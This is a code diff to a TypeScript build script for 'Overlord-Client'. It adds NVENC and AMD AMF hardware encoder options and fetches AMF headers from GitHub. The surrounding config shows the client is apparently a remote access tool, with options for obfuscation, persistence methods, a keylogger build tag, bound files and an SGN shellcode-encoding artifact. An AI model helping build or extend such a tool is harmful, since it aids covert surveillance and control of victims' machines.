@@ -84,6 +84,8 @@ type BuildProcessConfig = {
   disableMutex?: boolean;
   stripDebug?: boolean;
   disableCgo?: boolean;
+  enableNvenc?: boolean;
+  enableAmf?: boolean;
   obfuscate?: boolean;
   enablePersistence?: boolean;
   persistenceMethods?: string[];
@@ -398,22 +400,83 @@ function nvcodecHeaderPath(clientDir: string): string {
   return path.join(clientDir, "third_party", "nvcodec", "nvEncodeAPI.h");
 }
 
-function ensureNVCodecHeaderForWindowsCgo(
+function amfHeaderPath(clientDir: string): string {
+  return path.join(clientDir, "third_party", "amf", "include", "core", "Factory.h");
+}
+
+const AMF_REPOSITORY = "https://github.com/GPUOpen-LibrariesAndSDKs/AMF.git";
+const AMF_REF = "v1.5.2";
+let amfHeaderProvision: Promise<void> | null = null;
+
+function copyDirectory(source: string, destination: string): void {
+  fs.mkdirSync(destination, { recursive: true });
+  for (const entry of fs.readdirSync(source, { withFileTypes: true })) {
+    const from = path.join(source, entry.name);
+    const to = path.join(destination, entry.name);
+    if (entry.isDirectory()) copyDirectory(from, to);
+    else if (entry.isFile()) fs.copyFileSync(from, to);
+  }
+}
+
+async function ensureAMFHeaders(
   clientDir: string,
   sendToStream: (data: any) => void,
-): void {
-  const headerPath = nvcodecHeaderPath(clientDir);
-  if (fs.existsSync(headerPath)) {
-    sendToStream({
-      type: "output",
-      text: `Native NVENC header: ${headerPath}\n`,
-      level: "info",
+): Promise<void> {
+  const headerPath = amfHeaderPath(clientDir);
+  if (fs.existsSync(headerPath)) return;
+
+  if (!amfHeaderProvision) {
+    amfHeaderProvision = (async () => {
+      const destination = path.join(clientDir, "third_party", "amf");
+      const temporary = path.join(clientDir, "third_party", `.amf-${process.pid}-${Date.now()}`);
+      sendToStream({
+        type: "output",
+        text: `AMD AMF headers are not cached; fetching ${AMF_REF}...\n`,
+        level: "info",
+      });
+      try {
+        fs.mkdirSync(path.dirname(destination), { recursive: true });
+        const clone = await $`git clone --depth 1 --filter=blob:none --sparse --branch ${AMF_REF} ${AMF_REPOSITORY} ${temporary}`.quiet().nothrow();
+        if (clone.exitCode !== 0) throw new Error(clone.stderr.toString().trim() || "git clone failed");
+        const sparse = await $`git -C ${temporary} sparse-checkout set --no-cone amf/public/include/ LICENSE.txt`.quiet().nothrow();
+        if (sparse.exitCode !== 0) throw new Error(sparse.stderr.toString().trim() || "git sparse-checkout failed");
+        fs.rmSync(destination, { recursive: true, force: true });
+        fs.mkdirSync(destination, { recursive: true });
+        copyDirectory(path.join(temporary, "amf", "public", "include"), path.join(destination, "include"));
+        fs.copyFileSync(path.join(temporary, "LICENSE.txt"), path.join(destination, "LICENSE.txt"));
+      } finally {
+        fs.rmSync(temporary, { recursive: true, force: true });
+      }
+      if (!fs.existsSync(headerPath)) throw new Error(`AMF header was not created at ${headerPath}`);
+    })().catch((error) => {
+      amfHeaderProvision = null;
+      throw error;
     });
-    return;
   }
-  throw new Error(
-    "Native NVENC streaming requires Overlord-Client/third_party/nvcodec/nvEncodeAPI.h for Windows CGO builds. Restore the vendored header or run scripts/vendor-nvcodec-headers from the repo root.",
-  );
+  await amfHeaderProvision;
+}
+
+async function ensureNVCodecHeaderForWindowsCgo(
+  clientDir: string,
+  sendToStream: (data: any) => void,
+  enableNvenc: boolean,
+  enableAmf: boolean,
+): Promise<void> {
+  if (enableNvenc) {
+    const headerPath = nvcodecHeaderPath(clientDir);
+    if (!fs.existsSync(headerPath)) {
+      throw new Error(
+        "Native NVENC streaming requires Overlord-Client/third_party/nvcodec/nvEncodeAPI.h for Windows CGO builds. Restore the vendored header or run scripts/vendor-nvcodec-headers from the repo root.",
+      );
+    }
+    sendToStream({ type: "output", text: `Native NVENC header: ${headerPath}\n`, level: "info" });
+  }
+
+  if (enableAmf) {
+    await ensureAMFHeaders(clientDir, sendToStream);
+    const amfPath = amfHeaderPath(clientDir);
+    sendToStream({ type: "output", text: `Native AMD AMF headers: ${amfPath}\n`, level: "info" });
+  }
 }
 
 function writeSgnTextArtifact(
@@ -1056,7 +1119,12 @@ func runBoundFiles() {
       }
 
       if (effectiveOs === "windows" && env.CGO_ENABLED === "1") {
-        ensureNVCodecHeaderForWindowsCgo(clientDir, sendToStream);
+        await ensureNVCodecHeaderForWindowsCgo(
+          clientDir,
+          sendToStream,
+          config.enableNvenc !== false,
+          config.enableAmf !== false,
+        );
       }
 
       let ldflags = config.stripDebug !== false ? "-s -w -buildid=" : "";
@@ -1230,6 +1298,8 @@ func runBoundFiles() {
 
         // Base tags: always present regardless of build pass
         let baseTags: string[] = [];
+        if (config.enableNvenc === false) baseTags.push("no_nvenc");
+        if (config.enableAmf === false) baseTags.push("no_amf");
         if (config.noPrinting) baseTags.push("noprint");
         if (config.disableKeylogger) baseTags.push("nokeylogger");
         if (config.enableWebrtc) baseTags.push("overlord_webrtc");
